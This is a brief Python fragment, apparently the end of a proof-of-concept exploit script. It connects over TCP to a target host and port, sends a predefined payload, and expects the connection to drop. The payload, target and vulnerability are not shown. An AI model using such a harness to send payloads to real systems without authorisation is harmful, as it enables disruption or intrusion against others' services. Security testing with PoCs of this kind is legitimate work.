def execute_poc():
    print(("[*] Launching autonomous PoC against {}:{}".format(TARGET_HOST, TARGET_PORT)))
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.sendall(PAYLOAD)
            response = s.recv(1024)
            print(("[+] PoC transmitted successfully. Response received: {}".format(response)))
    except Exception as e:
        print(("[!] Target connection faulted or dropped as expected: {}".format(e)))

if __name__ == '__main__':
    execute_poc()
